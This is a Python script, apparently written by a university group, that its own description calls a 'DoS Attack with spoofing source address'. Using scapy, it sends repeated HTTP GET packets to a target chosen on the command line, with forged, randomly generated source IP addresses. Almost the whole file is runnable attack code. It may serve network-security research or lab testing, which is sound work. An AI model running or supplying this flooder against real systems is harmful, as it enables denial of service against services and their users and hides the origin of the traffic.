#!/usr/bin/python3
# -*- coding: utf-8 -*-

__author__ = 'Diego F, Denner R, Kayua O, Lucas A,'
__email__ = '@unipampa.edu.br '
__version__ = '{1}.{0}.{1}'
__data__ = '17/3/22'
__credits__ = ['All']

try:

    import logging
    import time
    from argparse import ArgumentParser
    from random import randint
    from tqdm import tqdm
    from view import View
    from sys import argv
    from scapy.sendrecv import send
    from headers import Header

except ImportError as error:

    print(error)
    print()
    print("1. Setup a virtual environment: ")
    print("  python3 - m venv ~/Python3env/Attack_low")
    print("  source ~/Python3env/Attack_low/bin/activate ")
    print()
    print("2. Install requirements:")
    print("  pip3 install --upgrade pip")
    print("  pip3 install -r requirements.txt ")
    print()
    exit(-1)

DEFAULT_HTTP_VERSION = 2.0
DEFAULT_NUMBER_PACKETS_PER_CYCLES = 1
DEFAULT_NUMBER_CYCLES = 100
DEFAULT_TIME_BETWEEN_CYCLES = 5
DEFAULT_SOURCE_ADDRESS = '10.10.10.10'
DEFAULT_RANDOM_ADDRESS_SOURCE = True
DEFAULT_DESTINATION_ADDRESS = '10.10.10.11'
DEFAULT_TIME_LIFE_PACKET = 10
DEFAULT_SOURCE_PORT = 80
DEFAULT_DESTINATION_PORT = 80
DEFAULT_NUMBER_RANDOM_ADDRESS = 100
DEFAULT_VERBOSITY = logging.INFO
TIME_FORMAT = '%Y-%m-%d,%H:%M:%S'


def init_view():
    print('')
    view = View()
    view.print_view()


def get_random_address_list(number_address):
    list_address = [[randint(0, 255), randint(0, 255), randint(0, 255), randint(0, 255)] for i in range(number_address)]
    list_address = ['.'.join(list(map(str, i))) for i in list_address]
    return list_address


def create_spoofing_packet(requisition, version=DEFAULT_HTTP_VERSION):
    spoofing_packet = "GET /{} HTTP/{} \n\n".format(str(requisition), version)
    spoofing_packet = bytes(spoofing_packet, "utf-8")
    return spoofing_packet


def attack_function(args):
    headers = Header(args.time_life_packet, args.source_ip, args.destination_ip, args.source_port,
                     args.destination_port, 1)

    list_address = []

    if args.random_ip:
        list_address = get_random_address_list(args.number_address*10)

    logging.info('\nStart attack to Address {}\n'.format(args.destination_ip))

    for i in tqdm(range(args.number_cycles), desc='Attack progress'):

        new_requisition = create_spoofing_packet('index.html', version=args.http_version)

        if args.random_ip:
            headers.set_source_address(list_address[randint(0, args.number_address)])

        packet_spoofing = headers.create_header_network_layer()
        packet_spoofing = headers.create_header_transport_layer(packet_spoofing)
        packet_spoofing = headers.create_header_application_layer(packet_spoofing, new_requisition)
        packet_spoofing = packet_spoofing * args.packets_per_cycle
        send(packet_spoofing, verbose=0)
        time.sleep(args.sleep)

    logging.info("Attack End Address {}".format(args.destination_ip))


def show_config(args):
    logging.info('Settings:')
    lengths = [len(x) for x in vars(args).keys()]
    max_lengths = max(lengths)

    for parameters, item_args in sorted(vars(args).items()):
        message = "\t"
        message += parameters.ljust(max_lengths, ' ')
        message += ' : {}'.format(item_args)
        logging.info(message)

    logging.info("")


def add_arguments(parser):
    help_msg = 'Http version protocol (Default {})'.format(DEFAULT_HTTP_VERSION)
    parser.add_argument("--http_version", type=float, help=help_msg, default=DEFAULT_HTTP_VERSION)

    help_msg = 'Number packets per cycle (Default {})'.format(DEFAULT_NUMBER_PACKETS_PER_CYCLES)
    parser.add_argument("--packets_per_cycle", type=int, help=help_msg, default=DEFAULT_NUMBER_PACKETS_PER_CYCLES)

    help_msg = 'Number cycles (Default {})'.format(DEFAULT_NUMBER_CYCLES)
    parser.add_argument("--number_cycles", type=int, help=help_msg, default=DEFAULT_NUMBER_CYCLES)

    help_msg = 'Sleep time between cycles (Default {})'.format(DEFAULT_TIME_BETWEEN_CYCLES)
    parser.add_argument("--sleep", type=int, help=help_msg, default=DEFAULT_TIME_BETWEEN_CYCLES)

    help_msg = 'Source address provider (Default {})'.format(DEFAULT_SOURCE_ADDRESS)
    parser.add_argument("--source_ip", type=str, help=help_msg, default=DEFAULT_SOURCE_ADDRESS)

    help_msg = 'Random mode source address provider (Default {})'.format(DEFAULT_RANDOM_ADDRESS_SOURCE)
    parser.add_argument("--random_ip", type=bool, help=help_msg, default=DEFAULT_RANDOM_ADDRESS_SOURCE)

    help_msg = 'Destination address provider (Default {})'.format(DEFAULT_DESTINATION_ADDRESS)
    parser.add_argument("--destination_ip", type=str, help=help_msg, default=DEFAULT_DESTINATION_ADDRESS)

    help_msg = 'Define time life packet (Default {})'.format(DEFAULT_TIME_LIFE_PACKET)
    parser.add_argument("--time_life_packet", type=int, help=help_msg, default=DEFAULT_TIME_LIFE_PACKET)

    help_msg = 'Define source port (Default {})'.format(DEFAULT_SOURCE_PORT)
    parser.add_argument("--source_port", type=int, help=help_msg, default=DEFAULT_SOURCE_PORT)

    help_msg = 'Define source port (Default {})'.format(DEFAULT_DESTINATION_PORT)
    parser.add_argument("--destination_port", type=int, help=help_msg, default=DEFAULT_DESTINATION_PORT)

    help_msg = 'Define size list random address (Default {})'.format(DEFAULT_NUMBER_RANDOM_ADDRESS)
    parser.add_argument("--number_address", type=int, help=help_msg, default=DEFAULT_NUMBER_RANDOM_ADDRESS)
    help_msg = 'Define verbosity level (Default {})'.format(DEFAULT_VERBOSITY)
    parser.add_argument("--verbosity", "-v", help="error", default=DEFAULT_VERBOSITY, type=int)

    return parser


def main():
    argument_parser = ArgumentParser(description='DoS Attack with spoofing source address')
    argument_parser = add_arguments(argument_parser)
    arguments = argument_parser.parse_args()

    if arguments.verbosity == logging.DEBUG:
        logging.basicConfig(format="%(asctime)s %(levelname)s {%(module)s} [%(funcName)s] %(message)s",
                            datefmt=TIME_FORMAT, level=arguments.verbosity)

    else:

        logging.basicConfig(format="%(message)s", datefmt=TIME_FORMAT, level=arguments.verbosity)
    init_view()
    show_config(arguments)
    attack_function(arguments)


if __name__ == '__main__':
    exit(main())
